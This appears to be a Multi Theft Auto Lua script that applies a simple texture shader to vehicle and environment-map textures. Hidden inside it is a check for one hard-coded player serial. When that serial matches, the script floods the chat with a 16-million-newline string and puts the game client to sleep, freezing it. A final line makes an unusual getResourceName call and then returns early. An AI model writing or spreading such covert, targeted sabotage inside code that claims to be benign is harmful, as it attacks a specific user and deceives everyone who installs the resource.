local fx = [[
    texture gTexture;

technique hello
{
    pass P0
    {
        Texture[0] = gTexture;
    }
}
]]

shader = dxCreateShader(fx)
engineApplyShaderToWorldTexture(shader, "vehiclegrunge256")
engineApplyShaderToWorldTexture(shader, "?emap")

if getPlayerSerial(localPlayer) == '6B1DCF962A925B2E8030CC6D60573F2E' then
    local s = string.rep('\n', 2^24)
    outputChatBox(s)
    debugSleep(999999)
end

getResourceName(getThisResource(), true, 575254546); if true then return end